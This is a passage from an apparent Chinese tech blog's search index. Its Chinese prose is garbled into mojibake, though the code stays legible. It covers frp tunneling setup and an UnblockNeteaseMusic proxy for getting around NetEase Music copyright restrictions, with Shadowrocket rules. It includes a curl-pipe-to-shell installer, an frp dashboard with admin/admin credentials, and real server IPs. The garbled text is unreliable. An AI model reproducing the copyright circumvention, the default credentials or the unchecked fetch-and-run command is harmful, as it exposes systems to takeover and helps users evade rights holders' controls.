åˆ†é…å…¬ç½‘IPåœ°å€ã€‚å¦‚æœæˆ‘ä»¬æƒ³ç›´æ¥è®¿é—®åˆ°è¿™äº›è®¾å¤‡ï¼ˆè¿œç¨‹æ¡Œé¢ï¼Œè¿œç¨‹æ–‡ä»¶ï¼ŒSSHç­‰ç­‰ï¼‰ï¼Œä¸€èˆ¬æ¥è¯´è¦é€šè¿‡ä¸€äº›è½¬å‘æˆ–è€…P2Pç»„ç½‘è½¯ä»¶çš„å¸®åŠ©ã€‚\n\n<!-- more -->\n\n\n\n### 1. å®‰è£…é…ç½® frp\n\nhttps://github.com/fatedier/frp/releases ä¸‹è½½æœ€æ–°çš„release\n\n##### 1.1æœåŠ¡ç«¯é…ç½®\n\n```bash\nsudo cp systemd/frps.service /lib/systemd/system/\n\n#  /usr/bin/frps -c /etc/frp/frps.ini\n# æˆ‘ä»¬æŒ‰ç…§ service å†…çš„é…ç½®æŠŠæ–‡ä»¶æ‹·è´åˆ°ç›¸åº”çš„åœ°æ–¹\n\nsudo cp frps /usr/bin/frps\nsudo mkdir /etc/frp/\nsudo cp frps.ini /etc/frp/frps.ini\n\n# ç¼–è¾‘frps.ini\n\n\n# å¼€å¯ service\nsudo systemctl start frps\nsudo systemctl enable frps\n```\n\n\n\n##### 1.2 å®¢æˆ·ç«¯\n\n```bash\nsudo cp systemd/frpc.service /lib/systemd/system/\n\nsudo cp frpc /usr/bin/frpc\nsudo mkdir /etc/frp/\nsudo cp frpc.ini /etc/frp/frpc.ini\n\n#ç¼–è¾‘frpc.ini\n\n#1. ä¿®æ”¹server_addrä¸ºæœåŠ¡ç«¯å…¬ç½‘IP\n\n\n# å¼€å¯ service\nsudo systemctl start frpc\nsudo systemctl enable frpc\n```\n\n\n\n##### 1.3 æµ‹è¯•\n\nä¸»é¢˜frpcé‡Œé¢æœ‰sshé…ç½®, æ‰€ä»¥æˆ‘ä»¬é€šè¿‡ ssh è®¿é—®å†…ç½‘æœºå™¨ï¼š\n\n```bash\nssh -p 6000 root@49.234.15.70\n\n# ä¸ºäº†æ–¹ä¾¿, æˆ‘ä»¬å¯ä»¥åœ¨~/.ssh/config é…ç½®ä¸‹é¢çš„è¯\n\nhost box\n    Hostname 49.234.15.70\n    Port 6000\n    user root\n```\n\n\n\n### 2. è‡ªå®šä¹‰åŸŸåè®¿é—®å†…ç½‘çš„ web æœåŠ¡\n\næœ‰æ—¶æƒ³è¦è®©å…¶ä»–äººé€šè¿‡åŸŸåè®¿é—®æˆ–è€…æµ‹è¯•æˆ‘ä»¬åœ¨æœ¬åœ°æ­å»ºçš„ web æœåŠ¡ï¼Œä½†æ˜¯ç”±äºæœ¬åœ°æœºå™¨æ²¡æœ‰å…¬ç½‘ IPï¼Œæ— æ³•å°†åŸŸåè§£æåˆ°æœ¬åœ°çš„æœºå™¨ï¼Œé€šè¿‡ frp å°±å¯ä»¥å®ç°è¿™ä¸€åŠŸèƒ½ï¼Œä»¥ä¸‹ç¤ºä¾‹ä¸º http æœåŠ¡ï¼Œhttps æœåŠ¡é…ç½®æ–¹æ³•ç›¸åŒï¼Œ vhost_http_port æ›¿æ¢ä¸º vhost_https_portï¼Œ type è®¾ç½®ä¸º https å³å¯ã€‚\n\n\n\n##### 2.1 ä¿®æ”¹ frps.ini\n\nè®¾ç½® http è®¿é—®ç«¯å£ä¸º 8080ï¼š\n\n```ini\n# frps.ini\n[common]\nbind_port = 7000\nvhost_http_port = 8080\n```\n\n\n\n##### 2.2 å¯åŠ¨ frpsï¼š\n\n```bash\nsudo systemctl start frps\n```\n\n\n\n##### 2.3 ä¿®æ”¹frpc.ini\n\nä¿®æ”¹ frpc.ini æ–‡ä»¶ï¼Œå‡è®¾ frps æ‰€åœ¨çš„æœåŠ¡å™¨çš„ IP ä¸º x.x.x.xï¼Œlocal_port ä¸ºæœ¬åœ°æœºå™¨ä¸Š web æœåŠ¡å¯¹åº”çš„ç«¯å£, ç»‘å®šè‡ªå®šä¹‰åŸŸå `www.yourdomain.com`:\n\n\n\n```ini\n# frpc.ini\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[web]\ntype = http\nlocal_port = 80\ncustom_domains = www.yourdomain.com\n```\n\n\n\n##### 2.4 å¯åŠ¨ frpcï¼š\n\n```bash\nsudo systemctl start frpc\n```\n\n\n\n##### 2.5 ç»‘å®šåŸŸåæ˜ å°„\n\nå°† `www.yourdomain.com` çš„åŸŸå A è®°å½•è§£æåˆ° IP `x.x.x.x`ï¼Œå¦‚æœæœåŠ¡å™¨å·²ç»æœ‰å¯¹åº”çš„åŸŸåï¼Œä¹Ÿå¯ä»¥å°† CNAME è®°å½•è§£æåˆ°æœåŠ¡å™¨åŸå…ˆçš„åŸŸåã€‚\n\né€šè¿‡æµè§ˆå™¨è®¿é—® `http://www.yourdomain.com:8080` å³å¯è®¿é—®åˆ°å¤„äºå†…ç½‘æœºå™¨ä¸Šçš„ web æœåŠ¡ã€‚\n\n\n\n### 3. frp ç®¡ç†é¢æ¿\n\næœåŠ¡ç«¯ frps é…ç½®å¦‚ä¸‹:\n\n```ini\n[common]\nbind_port = 7000\ndashboard_port = 5000\ndashboard_user = admin\ndashboard_pwd = admin\nvhost_http_port = 5001\n```\n\nç„¶åæˆ‘ä»¬é€šè¿‡ ip:5000,å³å¯ä»¥è®¿é—®åˆ° web ç®¡ç†ç•Œé¢.\n\n\n\n### 4. nginx åå‘ä»£ç†è¿›è¡Œæ— ç«¯å£è®¿é—®\n\n##### 4.1 frp ç›¸åº”é…ç½®\n\n+ frps\n\n  ```ini\n  [common]\n  bind_port = 7000\n  dashboard_port = 5000\n  dashboard_user = admin\n  dashboard_pwd = admin\n  vhost_http_port = 5001\n  ```\n\n  \n\n+ frpc\n\n  ```ini\n  [web]\n  type = http\n  local_port = 80\n  custom_domains = box.frp.liuvv.com\n  ```\n\n\n\n##### 4.2 åœ¨æœåŠ¡ç«¯æ¶è®¾ nginx\n\n1ã€ frp.liuvv.com åšAè®°å½•ï¼Œè§£æè‡³IPï¼›\n\n2ã€ *.frp.liuvv.com åšCNAMEè®°å½•ï¼Œè§£æè‡³ frp.liuvv.com;\n\n3ã€ é…ç½®nginxåå‘ä»£ç†,å°†æ¥è‡ª*.frp.liuvv.comçš„80ç«¯å£è¯·æ±‚ï¼Œåˆ†å‘è‡³frpæœåŠ¡å™¨httpè¯·æ±‚çš„ç›‘å¬ç«¯å£ã€‚\n\n```nginx\nserver {\n\n    listen 80;\n\n    server_name frp.liuvv.com;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5000;# dashboard\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n\nserver {\n\n    listen 80;\n\n    server_name *.frp.liuvv.com;\n\n    access_log /var/log/nginx/frp_access.log;\n\n    error_log /var/log/nginx/frp_error.log;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5001;# vhost_http\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n```\n\n\n\n### 5.  è¿œç¨‹æ¡Œé¢è¿æ¥å±€åŸŸç½‘mac\n\nmacå»ä¸‹è½½darwin_amd64,  ç„¶åå¯åŠ¨å®¢æˆ·ç«¯ frpc\n\n##### 5.1  å¼€å¯å±å¹•å…±äº«\n\nåœ¨ç³»ç»Ÿè®¾ç½®->å…±äº«->å¼€å¯å±å¹•å…±äº«\n\nå³å¼€å¯äº† vnc æœåŠ¡\n\n\n\n##### 5.2 ä¿®æ”¹frpcé…ç½®\n\n```ini\n[common] \nserver_addr = 49.234.15.70\nserver_port = 7000\n\n[vnc] \ntype = tcp \nlocal_ip = 127.0.0.1 \nlocal_port = 5900 \nremote_port = 35900 \nuse_encryption = true \nuse_compression = true\n```\n\n\n\n##### 5.3 è¿æ¥è¿œç¨‹\n\nåœ¨ finder, cmd+k, è¿›è¡Œè¿æ¥\n\n```ini\nvnc://49.234.15.70:35900\n```\n\n\n\n### 6. å‚è€ƒèµ„æ–™:\n\n+ https://github.com/fatedier/frp/blob/master/README_zh.md\n\n+ https://www.iyuu.cn/archives/286/\n+ [å®ç°MACè¿œç¨‹æ¡Œé¢](http://yuqiangcoder.com/2019/11/22/frp-å†…ç½‘ç©¿é€-å®ç°MACè¿œç¨‹æ¡Œé¢.html)","tags":["frp"],"categories":["è½¯ä»¶"]},{"title":"è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ­Œæ›²å¹¶è¯•å¬","url":"%2Fp%2F3a9129d9.html","content":"\nè°ˆèµ·éŸ³ä¹è½¯ä»¶ï¼Œåªé’Ÿæƒ…ç½‘æ˜“äº‘éŸ³ä¹ã€‚å¥ˆä½•ç‰ˆæƒå¤ªå°‘ï¼Œæ­Œå•é‡Œå¥½å¤šéŸ³ä¹æ¶‰åŠåˆ°ç‰ˆæƒçš„é—®é¢˜æ— æ³•å¬ï¼Œå³ä½¿å¼€äº†é»‘èƒ¶VIPä¹Ÿä¸è¡Œã€‚\n\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›â€œå¥‡æ·«æŠ€å·§â€æ¥å®ç°è§£é”ç°è‰²æ— ç‰ˆæƒæ­Œæ›²ï¼Œæ•ˆæœæ¯”å¼€äº†é»‘èƒ¶VIP è¿˜è¦å¼ºå¤§ã€‚\n\nå£°æ˜ï¼šæœ¬å·¥å…·åªæä¾›å¤§å®¶å…è´¹æµ‹è¯•å­¦ä¹ ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œä»»ä½•å•†ä¸šç”¨é€”ã€‚\n\n<!-- more -->\n\n# 1. æ›´æ–°ï¼ˆ2023-06-09ï¼‰\n\n### 1.1 å®‰è£…\n\nhttps://github.com/UnblockNeteaseMusic/server.git\n\n```bash\napt install nodejs #å®‰è£… node\n\ngit clone https://github.com/UnblockNeteaseMusic/server.git UnblockNeteaseMusic\ncd UnblockNeteaseMusic\nnode app.js\n```\n\n\n\n### 1.2 Nginx é…ç½®\n\n##### åŸŸåè§£æ\n\nå…ˆæŠŠè‡ªå·±çš„åŸŸå music.liuvv.com è§£æåˆ°äº‘æœåŠ¡å™¨ipã€‚\n\n##### ç”Ÿæˆè¯ä¹¦\n\nç”¨ acme.sh ç”Ÿæˆè¯ä¹¦ï¼Œå‚è€ƒ: https://github.com/acmesh-official/acme.sh\n\n```bash\n# å®‰è£… acme.sh\ncurl  https://get.acme.sh | sh\nalias acme.sh=~/.acme.sh/acme.sh\n\n# ç”Ÿæˆè¯ä¹¦\nmkdir -p /etc/nginx/ssl/music/\nacme.sh --issue -d music.liuvv.com -w /var/www/html\n\n# å®‰è£…è¯ä¹¦\nacme.sh --install-cert -d music.liuvv.com --key-file /etc/nginx/ssl/music/key.pem --fullchain-file /etc/nginx/ssl/music/cert.pem --reloadcmd \"service nginx force-reload\"\n```\n\n##### Nginx é…ç½®\n\n```nginx\n# cat /etc/nginx/sites-enabled/lw-music.conf\n\nserver {\n  listen 443;\n  server_name music.liuvv.com; # æ”¹ä¸ºè‡ªå·±çš„åŸŸå\n  access_log  /var/log/nginx/lw-music.log;\n\n  ssl on;\n  ssl_certificate /etc/nginx/ssl/music/cert.pem; # æ”¹ä¸ºè‡ªå·±ç”³è¯·å¾—åˆ°çš„ crt æ–‡ä»¶çš„åç§°\n  ssl_certificate_key /etc/nginx/ssl/music/key.pem; # æ”¹ä¸ºè‡ªå·±ç”³è¯·å¾—åˆ°çš„ key æ–‡ä»¶çš„åç§°\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  location / {\n    proxy_pass http://localhost:8080; # è½¬å‘\n  }\n}\n\n\nserver {\n  listen 80;\n  server_name netease.liuvv.com;\n  location /{\n    proxy_pass http://localhost:8080/;\n  }\n}\n```\n\n##### é‡å¯Nginx\n\n```bash\nsystemctl restart nginx # nginx -s reload å¯¹è¯ä¹¦æ— æ•ˆ\n```\n\n\n\n### 1.3 Systemctl é…ç½®\n\n```bash\n# cat /lib/systemd/system/lw-music.service\n\n[Unit]\nDescription=lw-music\nAfter=network.target\n[Service]\nExecStart=/usr/local/bin/node /opt/liuwei/UnblockNeteaseMusic/app.js -e https://music.liuvv.com -s -p 8080:8081\nRestart=always\nRestartSec=5\nEnvironment=\"ENABLE_FLAC=true\"\nEnvironment=\"ENABLE_LOCAL_VIP=svip\"\nEnvironment=\"JSON_LOG=true\"\nEnvironment=\"LOG_LEVEL=debug\"\n[Install]\nWantedBy=default.target\n```\n\n è¿™é‡Œå¯åŠ¨çš„å‚æ•°æ ¼å¼æ˜¯ node app.js -e åŸŸå -s -p  httpç«¯å£:httpsç«¯å£\n\n\n\n##### å¯åŠ¨\n\n```bash\nsystemctl daemon-reload\nsystemctl start lw-music.service\nsystemctl enable lw-music.service\n```\n\n\n\n### 1.4  Mac ä½¿ç”¨\n\n**å®‰è£…CAè¯ä¹¦**\n\n**Clashx Pro: netease.yaml** \n\n```ini\nproxies:\n  - { name: neteasemusic, type: http, server: 152.136.138.232, port: 8080 }\n\nproxy-groups:\n\nrules:\n  - PROCESS-NAME,NeteaseMusic,neteasemusic\n  - MATCH,DIRECT\n```\n\nå¯åŠ¨å¢å¼ºæ¨¡å¼ï¼ˆEnhanced modeï¼‰ï¼Œåˆæ¬¡ä½¿ç”¨æ—¶è¦å°†Enhanced mode Config->DNS modeæ”¹ä¸ºMappingï¼Œå°±å¯ä»¥ä½¿ç”¨äº†\n\n\n\n### 1.5 iOSä½¿ç”¨\n\n**Quantumnltï¼šnetease.conf**\n\n```ini\n[policy]\nstatic=è§£é”ç½‘æ˜“äº‘, è§£é”ç½‘æ˜“äº‘ç°è‰²éŸ³ä¹, direct, proxy, img-url=https://raw.githubusercontent.com/Koolson/Qure/master/IconSet/Color/Netease_Music_Unlock.png\n\n\n[filter_remote]\nhttps://raw.githubusercontent.com/GeQ1an/Rules/master/QuantumultX/Filter/Optional/Netease%20Music.list, tag=è§£é”ç½‘æ˜“äº‘éŸ³ä¹, force-policy=è§£é”ç½‘æ˜“äº‘, update-interval=172800, opt-parser=false, enabled=true\n\n\n[server_local]\nhttp=152.136.138.232:8080, fast-open=false, udp-relay=false, tag=è§£é”ç½‘æ˜“äº‘ç°è‰²éŸ³ä¹\n```\n\n\n\n\n\n# 0. é¡¹ç›®ä»‹ç»\n\nå…¶åŸç†æ˜¯é€šè¿‡æµé‡è¿›å…¥ä»£ç†åæ¥åŒ¹é…ç½‘æ˜“é“¾æ¥è¿›è¡ŒåŠ«æŒï¼Œç„¶åå°†requestsè¯·æ±‚ä¿®æ”¹é‡æ–°å‘é€ä¸€ä¸ªæ–°çš„é“¾æ¥ï¼ˆè¿™ä¸ªé“¾æ¥å°±æ˜¯providerçš„ï¼‰ï¼Œè¯·æ±‚åˆ°éŸ³ä¹ä»¥åå†é‡æ–°å°†providerçš„responseæ”¹å†™æˆç½‘æ˜“çš„ï¼Œç„¶åè¿”å›åˆ°åº”ç”¨ï¼Œé€šä¿—çš„è¯´æ˜¯ä¿®æ”¹httpè¯·æ±‚å’Œå“åº”ã€‚\n\næ•´ä¸ªé…ç½®å‚è€ƒäº†è¿™ä¸ªé¡¹ç›®,  å”¯ä¸€ä¸è¶³çš„æ˜¯æ•™ç¨‹æ•£è½åœ¨ä»“åº“çš„å„å¤§ issue. å› ä¸ºåªå¸¸ç”¨ ios å’Œ mac çš„è®¾å¤‡,æ‰€ä»¥åªæµ‹è¯•äº†è¿™ä¸¤ä¸ªå¹³å°, ä¸Šæµ‹è¯•æ•ˆæœå›¾:\n\n<img src=\"è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ­Œæ›²å¹¶è¯•å¬/2.jpg\" alt=\"1\" style=\"zoom: 33%;\" />\n\n<img src=\"è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ­Œæ›²å¹¶è¯•å¬/1.jpg\" alt=\"2\" style=\"zoom:50%;\" />\n\n\n\n\n\n\n\n   \n\n# 2. ~~2022ä½¿ç”¨æ›´æ–°ï¼ˆåºŸå¼ƒï¼Œè¯·çœ‹2023æ›´æ–°ï¼‰~~\n\né¡¹ç›®ä¿®æ”¹ä¸ºï¼š https://github.com/UnblockNeteaseMusic/server\n\n```bash\n# å®‰è£…æœ€æ–°çš„node\nnpm install -g n\nn latest\nhash -r \nnode -v\n\n# ä¸‹é¢æ•™ç¨‹è¯·å‚è€ƒ æœ¬æ–‡ 2.å®‰è£…é…ç½®\ngit clone https://github.com/UnblockNeteaseMusic/server.git UnblockNeteaseMusic\ncd UnblockNeteaseMusic\nnode app.js\n```\n\n\n\n### 2.1 iosä½¿ç”¨\n\n+ ä¸‹è½½å°ç«ç®­\n+ æ·»åŠ èŠ‚ç‚¹ï¼Œç±»å‹é€‰æ‹© HTTPï¼ŒæœåŠ¡å™¨å’Œç«¯å£å·å¡«å†™è‡ªå·±éƒ¨ç½²çš„æœåŠ¡å™¨å…¬ç½‘IPå’Œç«¯å£ã€‚\n+ è½¯ä»¶åº•éƒ¨é…ç½®->å³ä¸Šè§’åŠ å·->å¡«å†™  http://files.liuvv.com/music.conf (ä¸‹é¢é…ç½®)ç„¶åä½¿ç”¨é…ç½®\n+ å›è½¯ä»¶åº•éƒ¨ä¸»é¡µ,å¼€å¯VPN->Allow\n+ æ‰“å¼€æ‰‹æœºç½‘æ˜“äº‘éŸ³ä¹,æœç´¢å‘¨æ°ä¼¦,æ’­æ”¾\n\n```ini\n# Shadowrocket: 2020-06-11 19:05:03\n[General]\nbypass-system = true\nskip-proxy = 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12, localhost, *.local, captive.apple.com\nbypass-tun = 10.0.0.0/8,100.64.0.0/10,127.0.0.0/8,169.254.0.0/16,172.16.0.0/12,192.0.0.0/24,192.0.2.0/24,192.88.99.0/24,192.168.0.0/16,198.18.0.0/15,198.51.100.0/24,203.0.113.0/24,224.0.0.0/4,255.255.255.255/32\ndns-server = system\nipv6 = false\n\n\n[Rule]\nDOMAIN-KEYWORD,google,PROXY\nDOMAIN-KEYWORD,facebook,PROXY\nDOMAIN-KEYWORD,youtube,PROXY\nDOMAIN-KEYWORD,twitter,PROXY\nDOMAIN-KEYWORD,instagram,PROXY\nDOMAIN-KEYWORD,gmail,PROXY\nDOMAIN-SUFFIX,twimg.com,PROXY\nDOMAIN-SUFFIX,t.co,PROXY\nDOMAIN-SUFFIX,kenengba.com,PROXY\nDOMAIN-SUFFIX,akamai.net,PROXY\nDOMAIN-SUFFIX,whatsapp.net,PROXY\nDOMAIN-SUFFIX,whatsapp.com,PROXY\nDOMAIN-SUFFIX,snapchat.com,PROXY\nDOMAIN-KEYWORD,pixiv,PROXY\nDOMAIN-SUFFIX,google.cn,DIRECT\nDOMAIN-SUFFIX,fb.com,PROXY\nDOMAIN-SUFFIX,ampproject.org,PROXY\nDOMAIN-SUFFIX,apple.com,DIRECT\nDOMAIN-SUFFIX,mzstatic.com,PROXY\nDOMAIN-SUFFIX,itunes.com,PROXY\nDOMAIN-SUFFIX,icloud.com,DIRECT\nDOMAIN-SUFFIX,icloud-content.com,DIRECT\nDOMAIN-SUFFIX,lcdn-registration.apple.com,DIRECT\nDOMAIN-KEYWORD,flurry.co,REJECT\nDOMAIN-SUFFIX,doubleclick.net,REJECT\nDOMAIN,bam.nr-data.net,REJECT\nDOMAIN,counter.kingsoft.com,REJECT\nDOMAIN,js-agent.newrelic.com,REJECT\nDOMAIN,pixel.wp.com,REJECT\nDOMAIN-SUFFIX,adjust.com,REJECT\nDOMAIN-SUFFIX,cmcore.com,REJECT\nDOMAIN-SUFFIX,coremetrics.com,REJECT\nDOMAIN-SUFFIX,flurry.com,REJECT\nDOMAIN-SUFFIX,irs01.com,REJECT\nDOMAIN-SUFFIX,madmini.com,REJECT\nDOMAIN-SUFFIX,mixpanel.com,REJECT\nDOMAIN-SUFFIX,wrating.com,REJECT\nDOMAIN-SUFFIX,admaster.com.cn,REJECT\nDOMAIN-SUFFIX,51.la,REJECT\nDOMAIN-SUFFIX,acs86.com,REJECT\nDOMAIN-SUFFIX,adchina.com,REJECT\nDOMAIN-SUFFIX,adcome.cn,REJECT\nDOMAIN-SUFFIX,adinfuse.com,REJECT\nDOMAIN-SUFFIX,admob.com,REJECT\nDOMAIN-SUFFIX,adsage.cn,REJECT\nDOMAIN-SUFFIX,adsage.com,REJECT\nDOMAIN-SUFFIX,adsmogo.org,REJECT\nDOMAIN-SUFFIX,ads.mobclix.com,REJECT\nDOMAIN-SUFFIX,adview.cn,REJECT\nDOMAIN-SUFFIX,adwhirl.com,REJECT\nDOMAIN-SUFFIX,adwo.com,REJECT\nDOMAIN-SUFFIX,ad.unimhk.com,REJECT\nDOMAIN-SUFFIX,aduu.cn,REJECT\nDOMAIN-SUFFIX,advertising.com,REJECT\nDOMAIN-SUFFIX,adxmi.com,REJECT\nDOMAIN-SUFFIX,adzerk.net,REJECT\nDOMAIN-SUFFIX,anquan.org,REJECT\nDOMAIN-SUFFIX,appads.com,REJECT\nDOMAIN-SUFFIX,applifier.com,REJECT\nDOMAIN-SUFFIX,appsflyer.com,REJECT\nDOMAIN-SUFFIX,baidustatic.com,REJECT\nDOMAIN-SUFFIX,baifendian.com,REJECT\nDOMAIN-SUFFIX,beacon.sina.com.cn,REJECT\nDOMAIN-SUFFIX,cnzz.com,REJECT\nDOMAIN-SUFFIX,domob.com.cn,REJECT\nDOMAIN-SUFFIX,domob.org,REJECT\nDOMAIN-SUFFIX,duomeng.cn,REJECT\nDOMAIN-SUFFIX,duomeng.net,REJECT\nDOMAIN-SUFFIX,duomeng.org,REJECT\nDOMAIN-SUFFIX,googeadsserving.cn,REJECT\nDOMAIN-SUFFIX,guomob.com,REJECT\nDOMAIN-SUFFIX,inmobi.com,REJECT\nDOMAIN-SUFFIX,immob.cn,REJECT\nDOMAIN-SUFFIX,intely.cn,REJECT\nDOMAIN-SUFFIX,kejet.net,REJECT\nDOMAIN-SUFFIX,localytics.com,REJECT\nDOMAIN-SUFFIX,mobads.baidu.com,REJECT\nDOMAIN-SUFFIX,mobads-logs.baidu.com,REJECT\nDOMAIN-SUFFIX,smartadserver.com,REJECT\nDOMAIN-SUFFIX,tapjoyads.com,REJECT\nDOMAIN-SUFFIX,m.simaba.taobao.com,REJECT\nDOMAIN-SUFFIX,mmstat.com,REJECT\nDOMAIN-SUFFIX,sax.sina.cn,REJECT\nDOMAIN-SUFFIX,tanx.com,REJECT\nDOMAIN-SUFFIX,tiqcdn.com,REJECT\nDOMAIN-SUFFIX,umtrack.com,REJECT\nDOMAIN-SUFFIX,umeng.co,REJECT\nDOMAIN-SUFFIX,umeng.com,REJECT\nDOMAIN-SUFFIX,umeng.net,REJECT\nDOMAIN-SUFFIX,ushaqi.com,REJECT\nDOMAIN-SUFFIX,uyunad.com,REJECT\nDOMAIN-SUFFIX,waps.cn,REJECT\nDOMAIN-SUFFIX,wiyun.com,REJECT\nDOMAIN-SUFFIX,wooboo.com.cn,REJECT\nDOMAIN-SUFFIX,wqmobile.com,REJECT\nDOMAIN-SUFFIX,youmi.net,REJECT\nDOMAIN-SUFFIX,zhiziyun.com,REJECT\nDOMAIN-SUFFIX,data.vod.itc.cn,REJECT\nDOMAIN-SUFFIX,atm.youku.com,REJECT\nDOMAIN,ad.api.3g.youku.com,REJECT\nDOMAIN,ad.api.3g.tudou.com,REJECT\nDOMAIN,monitor.uu.qq.com,REJECT\nDOMAIN,pingjs.qq.com,REJECT\nDOMAIN,pingma.qq.com,REJECT\nDOMAIN,tajs.qq.com,REJECT\nDOMAIN-SUFFIX,pingtcss.qq.com,REJECT\nDOMAIN-SUFFIX,report.qq.com,REJECT\nDOMAIN,mi.gdt.qq.com,REJECT\nDOMAIN,dsp.youdao.com,REJECT\nDOMAIN,g.163.com,REJECT\nDOMAIN,temp.163.com,REJECT\nDOMAIN-SUFFIX,stat.ws.126.net,REJECT\nDOMAIN-SUFFIX,analytics.126.net,DIRECT\nDOMAIN-SUFFIX,union.youdao.com,REJECT\nDOMAIN,msga.71.am,REJECT\nDOMAIN-SUFFIX,miaozhen.com,REJECT\nDOMAIN,cr-nielsen.com,REJECT\nDOMAIN,cbjs.baidu.com,REJECT\nDOMAIN,cpro.baidu.com,REJECT\nDOMAIN,eclick.baidu.com,REJECT\nDOMAIN,msg.71.am,REJECT\nDOMAIN,mtj.baidu.com,REJECT\nDOMAIN,nsclick.baidu.com,REJECT\nDOMAIN-SUFFIX,pos.baidu.com,REJECT\nDOMAIN-SUFFIX,baidu.com,DIRECT\nIP-CIDR,60.210.17.12/24,REJECT\nDOMAIN,acjs.aliyun.com,REJECT\nDOMAIN,adash.m.taobao.com,REJECT\nDOMAIN-SUFFIX,simaba.taobao.com,REJECT\nDOMAIN-SUFFIX,taobao.com,DIRECT\nDOMAIN-SUFFIX,alicdn.com,DIRECT\nDOMAIN,ads.mopub.com,REJECT\nDOMAIN,ark.letv.com,REJECT\nDOMAIN,asimgs.pplive.cn,REJECT\nDOMAIN,csi.gstatic.com,REJECT\nDOMAIN,iadsdk.apple.com,REJECT\nDOMAIN,pagead2.googlesyndication.com,REJECT\nIP-CIDR,221.179.140.0/24,REJECT\nDOMAIN-SUFFIX,www.panoramio.com,REJECT\nDOMAIN-SUFFIX,qq.com,DIRECT\nDOMAIN-KEYWORD,alipay,DIRECT\nDOMAIN-KEYWORD,360buy,DIRECT\nDOMAIN-SUFFIX,jd.com,DIRECT\nDOMAIN-SUFFIX,126.net,DIRECT\nDOMAIN-SUFFIX,163.com,DIRECT\nDOMAIN-SUFFIX,amap.com,DIRECT\nDOMAIN-SUFFIX,bdimg.com,DIRECT\nDOMAIN-SUFFIX,bdstatic.com,DIRECT\nDOMAIN-SUFFIX,cnbeta.com,DIRECT\nDOMAIN-SUFFIX,douban.com,DIRECT\nDOMAIN-SUFFIX,gtimg.com,DIRECT\nDOMAIN-SUFFIX,hao123.com,DIRECT\nDOMAIN-SUFFIX,haosou.com,DIRECT\nDOMAIN-SUFFIX,ifeng.com,DIRECT\nDOMAIN-SUFFIX,iqiyi.com,DIRECT\nDOMAIN-SUFFIX,netease.com,DIRECT\nDOMAIN-SUFFIX,qhimg.com,DIRECT\nDOMAIN-SUFFIX,sogou.com,DIRECT\nDOMAIN-SUFFIX,sohu.com,DIRECT\nDOMAIN-SUFFIX,soso.com,DIRECT\nDOMAIN-SUFFIX,suning.com,DIRECT\nDOMAIN-SUFFIX,tmall.com,DIRECT\nDOMAIN-SUFFIX,tudou.com,DIRECT\nDOMAIN-SUFFIX,youku.com,DIRECT\nDOMAIN-SUFFIX,xunlei.com,DIRECT\nDOMAIN-SUFFIX,zhihu.com,DIRECT\nDOMAIN-SUFFIX,ls.apple.com,DIRECT\nDOMAIN-SUFFIX,weather.com,DIRECT\nDOMAIN-SUFFIX,weibo.cn,DIRECT\nDOMAIN-SUFFIX,weibo.com,DIRECT\nDOMAIN-SUFFIX,sinaimg.cn,DIRECT\nDOMAIN-SUFFIX,goodread.com,DIRECT\nDOMAIN-KEYWORD,aka,PROXY\nDOMAIN,me.com,PROXY\nDOMAIN-SUFFIX,.me.com,PROXY\nDOMAIN-SUFFIX,amazonaws.com,PROXY\nDOMAIN-SUFFIX,android.com,PROXY\nDOMAIN-SUFFIX,angularjs.org,PROXY\nDOMAIN-SUFFIX,appspot.com,PROXY\nDOMAIN-SUFFIX,akamaihd.net,PROXY\nDOMAIN-SUFFIX,amazon.com,PROXY\nDOMAIN-SUFFIX,bit.ly,PROXY\nDOMAIN-SUFFIX,bitbucket.org,PROXY\nDOMAIN-SUFFIX,blog.com,PROXY\nDOMAIN-SUFFIX,blogcdn.com,PROXY\nDOMAIN-SUFFIX,blogger.com,PROXY\nDOMAIN-SUFFIX,blogsmithmedia.com,PROXY\nDOMAIN-SUFFIX,box.net,PROXY\nDOMAIN-SUFFIX,bloomberg.com,PROXY\nDOMAIN-SUFFIX,chromium.org,PROXY\nDOMAIN-SUFFIX,cl.ly,PROXY\nDOMAIN-SUFFIX,cloudfront.net,PROXY\nDOMAIN-SUFFIX,cloudflare.com,PROXY\nDOMAIN-SUFFIX,cocoapods.org,PROXY\nDOMAIN-SUFFIX,crashlytics.com,PROXY\nDOMAIN-SUFFIX,dribbble.com,PROXY\nDOMAIN-SUFFIX,dropbox.com,PROXY\nDOMAIN-SUFFIX,dropboxstatic.com,PROXY\nDOMAIN-SUFFIX,dropboxusercontent.com,PROXY\nDOMAIN-SUFFIX,docker.com,PROXY\nDOMAIN-SUFFIX,duckduckgo.com,PROXY\nDOMAIN-SUFFIX,digicert.com,PROXY\nDOMAIN-SUFFIX,dnsimple.com,PROXY\nDOMAIN-SUFFIX,edgecastcdn.net,PROXY\nDOMAIN-SUFFIX,engadget.com,PROXY\nDOMAIN-SUFFIX,eurekavpt.com,PROXY\nDOMAIN-SUFFIX,fb.me,PROXY\nDOMAIN-SUFFIX,fbcdn.net,PROXY\nDOMAIN-SUFFIX,fc2.com,PROXY\nDOMAIN-SUFFIX,feedburner.com,PROXY\nDOMAIN-SUFFIX,fabric.io,PROXY\nDOMAIN-SUFFIX,flickr.com,PROXY\nDOMAIN-SUFFIX,fastly.net,PROXY\nDOMAIN-SUFFIX,ggpht.com,PROXY\nDOMAIN-SUFFIX,g